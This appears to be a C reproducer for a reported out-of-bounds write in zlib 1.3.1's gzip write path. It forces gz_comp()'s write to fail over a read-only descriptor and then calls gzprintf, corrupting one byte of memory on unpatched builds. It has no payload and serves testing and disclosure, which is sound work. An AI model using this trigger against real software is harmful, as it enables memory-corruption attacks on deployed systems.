/* Deterministic reproducer for CVE-2026-85091 on zlib 1.3.1.
 * No sockets/timing: a gz handle over a read-only fd makes gz_comp()'s
 * internal write() fail, which on the direct-write path leaves strm.next_in
 * pointing into the caller's external buffer with avail_in > 0. After
 * gzclearerr(), gzprintf() computes an out-of-bounds destination from that
 * stale cross-object pointer and writes one byte past state->in.
 * Unpatched 1.3.1: out-of-bounds write (ASan abort). Patched: clean exit 0. */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "zlib.h"
#define WRITE_SIZE (1024 * 1024)
int main(void) {
    unsigned char *big = malloc(WRITE_SIZE);
    if (!big) return 2;
    for (int i = 0; i < WRITE_SIZE; i++) big[i] = (unsigned char)rand();
    /* A read-only descriptor: every write() inside gz_comp() fails. */
    int fd = open("/dev/zero", O_RDONLY);
    if (fd < 0) return 2;
    gzFile gz = gzdopen(fd, "wb");
    if (!gz) { close(fd); return 2; }
    /* Direct path (len >= state->size). gz_comp() write() fails -> gz_write
     * returns 0; unpatched leaves next_in in big[], avail_in > 0. */
    gzwrite(gz, big, WRITE_SIZE);
    gzclearerr(gz);
    /* Stale pointer consumed here: OOB one-byte write in unpatched 1.3.1. */
    gzprintf(gz, "x");
    gzclose(gz);
    free(big);
    return 0;
}
